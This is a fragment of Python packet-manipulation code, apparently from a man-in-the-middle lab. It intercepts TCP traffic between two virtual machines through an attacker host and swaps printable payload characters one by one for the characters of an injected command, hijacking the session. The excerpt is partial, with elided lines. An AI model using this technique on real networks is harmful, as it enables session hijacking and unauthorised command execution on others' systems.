...
commande_index = 0  # Index to track the current character in the command
    ...
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[Ether].dst == VM_M_MAC:
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            ...
            if  not(payload and payload[0] < 0x20 or payload[0] > 0x7E):
                ...
                if commande_index < len(commande):
                    newdata = commande[commande_index].encode()  # Convert to bytes
                    commande_index += 1
                else:
                    newdata = payload  # Use space after the command is exhausted
